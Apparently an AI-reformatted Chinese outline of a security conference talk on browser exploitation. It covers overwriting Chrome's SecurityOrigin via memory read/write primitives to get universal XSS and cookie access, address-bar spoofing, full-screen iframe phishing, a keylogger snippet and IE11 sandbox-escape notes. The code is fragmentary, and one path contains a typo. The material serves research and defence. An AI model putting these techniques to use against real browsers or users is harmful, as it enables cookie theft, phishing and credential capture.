### 代码优化

```cpp
bool canAccess = false;

if (m_protocol == other->m_protocol) {
    if (!m_domainWasSetInDOM && !other->m_domainWasSetInDOM) {
        if (m_host == other->m_host && m_port == other->m_port) {
            canAccess = true;
        }
    } else if (m_domainWasSetInDOM && other->m_domainWasSetInDOM) {
        if (m_domain == other->m_domain) {
            canAccess = true;
        }
    }
}

// ... 其他代码

return canAccess;
```

### UXSS（通用跨站脚本攻击）

#### 覆盖
- `m_protocol`
- `m_host`
- `m_port`
- `m_domain`
- `SecurityOrigin`

#### 获取当前安全源
```javascript
var v8DocAddr = leakAddr(document);
console.log('[+] JavaScript document address: ' + v8DocAddr.toString(16));

// ... 其他代码

var secOriAddr = readDWord(secOriPtrAddr);
console.log('[+] Security origin address: ' + secOriAddr.toString(16));
var hostPtrAddr = secOriAddr + 0x08;
console.log('[+] Host pointer address: ' + hostPtrAddr.toString(16));
var domainPtrAddr = secOriAddr + 0x0c;
console.log('[+] Domain pointer address: ' + domainPtrAddr.toString(16));

// ... 其他代码

// 用iframe页面的安全源覆盖当前安全源，以绕过同源策略
writeDWord(secOriPtrAddr, ifrSecOriAddr);
```

### X-Frame-Options
- **DENY**
  - GitHub
  - Twitter
  - Facebook
  - Gmail

#### 新窗口
- **新窗口** -> 不受限制
- **弹出窗口** -> 禁止
- **社会工程学**

#### 获取窗口的安全源
```javascript
var jsWinAddr = leakAddr(wins[idx]);
console.log('[+] JavaScript window address: ' + jsWinAddr.toString(16));

// ... 其他代码

var winSecOriAddr = readDWord(winSecOriPtrAddr);
console.log('[+] Window security origin address: ' + winSecOriAddr.toString(16));
var winHostAddr = readDWord(winSecOriAddr + 0x08);
console.log('[+] Window host address: ' + winHostAddr.toString(16));
var winDomainAddr = readDWord(winSecOriAddr + 0x0c);
console.log('[+] Window domain address: ' + winDomainAddr.toString(16));
```

### 演示
- **设置为相同源**
- **获取Cookie**

### 函数
```javascript
function appendIframes(urls) {
    iframes = [];
    for (var i = 0; i < urls.length; i++) {
        if (canAccessCookies()) {
            // ... 其他代码
        }
    }
}

function canAccessCookies() {
    return !isUnique();
}
```

### X-Frame-Options
- **覆盖 `m_isUnique`**

### 浏览器进程
- **浏览器进程** -> 网络
- **沙箱权限**
  - HTTP响应接收
  - HTTP头
- **浏览器** -> 顶层框架？

### 地址栏欺骗
- **顶层框架**
- **更改iframe的src** -> 顶层导航 -> 更改地址栏

### 渲染器进程
```cpp
params.transition = static_cast(params.transition | PAGE_TRANSITION_CLIENT_REDIRECT);
Send(new FrameHostMsg_DidCommitProvisionalLoad(routing_id_, params));
```

### 钓鱼
- **全屏显示iframe** -> 完全钓鱼
```javascript
iframes[i].frameBorder = 0;
iframes[i].width = "100%";
iframes[i].height = "100%";
```

### 键盘记录器
```javascript
function keylogger() {
    iframeDoc.onkeypress = function(e) {
        var get = window.event ? event : e;
        var key = get.keyCode ? get.keyCode : get.charCode;
    };
    setTimeout('alert("password: " + keys)', 10000);
}
```

### 沙箱和SOP的困境
- **Web安全机制** -> 沙箱进程
  - SOP
  - X-Frame-Options
  - 沙箱
  - CSP
- **其他浏览器？**
- **浏览器进程信任IPC消息**
- **沙箱** -> 软件安全
- **SOP** -> 请求与显示
- **内存破坏** -> 增强我们的BeEF

### 站点隔离
- **Google Chrome安全团队** -> 重构项目
- **期待他们的工作！**

### DEP的困境
- **冯·诺依曼架构** -> 注入
  - 命令
  - 代码
  - SQL
  - XSS
- **控制与特权** -> 代码
- **自我引用**
- **强大的权力伴随着巨大的缺陷**
  - 生物病毒
  - 计算机漏洞

### 跨学科类比（CDA）
- **数理逻辑悖论**
  - 哥德尔不完备定理
  - 说谎者悖论
  - “这个句子是假的。”
  - 罗素悖论
- **遗传生物学**
  - T4噬菌体
- **声学共振**

### 垃圾回收
- **jscript9** -> 保守GC
  - 对齐Dwords -> 指针
  - 数据被视为指针 -> 内存泄漏
  - IE中的信息泄漏

### IE 11利用
- **写PE到Temp/Low**
  - 从同一域复制
  - `C:\Windows\System32\cmd.exe`
  - `C:\Windows\System3or\calc.exe`
- **在Temp/Low中执行**
  - 伪造安全管理器（explib2 by guhe120）

### 过时ActiveX控件阻止
- **IE阻止过时的ActiveX控件**
  - 2014年8月
  - Java攻击

### 总结
- **ASLR, DEP, 沙箱和SOP** -> 困境
- **可用性与性能**
- **ROI缓解**
- **战斗将继续**

### 漏洞可利用性分析
- **修改VarArray容量**
  - 分离大的JavaScriptNativeIntArray或JavaScriptArray喷射

### 第二条利用路径
- **CElement::GetOffsetParentHelper**
  - CTreeNode::GetFancyFormatIndexHelper
- **CMarkup::GetGeneratedElement** // 写内存
- **Tree::FirstLetterBuilder::ComputeFirstLetterFormats**
  - Layout::ContentReader::GetTopWindow
  - Tree::ElementNode::FirstChild // 无限循环

### 修改后的内存
```cpp
0:007> dd 0d1e0000
0d1e0000  00000000 00000ff0 00000000 00000000
0d1e0010  00000000 000003f8 000003f8 00000000
之后 p: 00000000 000003f8 043803f8 000008a5
0d1e0020
```

通过以上优化，文本变得更加清晰、连贯和专业。希望这些改进对你有帮助！